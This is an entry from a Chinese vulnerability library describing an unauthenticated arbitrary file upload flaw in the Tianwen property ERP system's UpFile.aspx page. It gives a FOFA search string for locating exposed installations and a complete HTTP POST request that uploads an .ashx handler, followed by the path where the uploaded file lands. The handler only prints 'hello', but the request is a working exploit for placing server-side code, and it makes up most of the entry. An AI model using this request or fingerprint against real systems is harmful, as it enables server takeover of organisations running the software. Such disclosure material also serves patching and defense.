---
fofa: "body="
source: "wy876 漏洞文库"
---

# 天问物业ERP系统UpFile.aspx前台任意文件上传漏洞

# 一、漏洞简介
成都天问互联科技有限公司以软件开发和技术服务为基础，建立物业ERP应用系统，向物管公司提供旨在降低成本、保障品质、提升效能为目标的智慧物管整体解决方案。天问物业ERP系统UpFile.aspx存在文件上传漏洞，攻击者可以利用漏洞上传恶意文件获取服务器权限。

# 二、影响版本
+ 天问物业ERP

# 三、资产测绘
+ fofa`body="国家版权局软著登字第1205328号"`
+ 登录页面


# 四、漏洞复现
```plain
POST /HM/M_Main/UpLoad/UpFile.aspx HTTP/1.1
Content-Type: multipart/form-data; boundary=00content0boundary00
User-Agent: Java/1.8.0_381
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 487
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="UpFileData"; filename="1.ashx"

<% @ webhandler language="C#" class="AverageHandler" %> 
using System; 
using System.Web; 

public class AverageHandler : IHttpHandler 
{ 
    public bool IsReusable 
    { 
        get {
             return true; 
            } 
        } 
        public void ProcessRequest(HttpContext ctx) 
        { 
            ctx.Response.Write("hello"); 
        } 
    }
--00content0boundary00--

```


上传文件位置

```plain
http://xx.xx.xx.xx/UpLoadFile//Sys_HeaderImage/2023/08/493216795627.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tw7n0fcma3hvp61o>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
